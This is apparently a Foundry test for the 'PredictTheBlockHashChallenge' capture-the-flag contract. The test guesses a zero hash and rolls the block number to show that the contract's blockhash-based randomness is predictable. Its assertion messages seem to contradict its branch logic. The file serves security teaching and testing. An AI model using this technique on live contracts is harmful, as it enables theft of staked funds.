
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {
    PredictTheBlockHashChallenge public _contractUnderTest;

    address attacker = address(this);

    function setUp() public {
        vm.deal(attacker, 10 ether);
        vm.prank(attacker);
        _contractUnderTest = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        vm.assume(blockNumber >= block.number);
        vm.assume(blockNumber < type(uint256).max - 1000);

        vm.roll(blockNumber);

        vm.prank(attacker);
        _contractUnderTest.lockInGuess{value: 1 ether}(bytes32(0));

        uint256 targetBlock = block.number + 1;

        vm.roll(targetBlock);

        bytes32 expectedAnswer = blockhash(block.number);

        vm.prank(attacker);
        _contractUnderTest.settle();

        uint256 attackerBalance = attacker.balance;
        if (expectedAnswer == bytes32(0)) {
            assertEq(attackerBalance, 8 ether, "Attacker should not win if guess mismatches");
        } else {
            assertEq(attackerBalance, 10 ether, "Attacker can predict and win given blockhash");
        }
    }
}
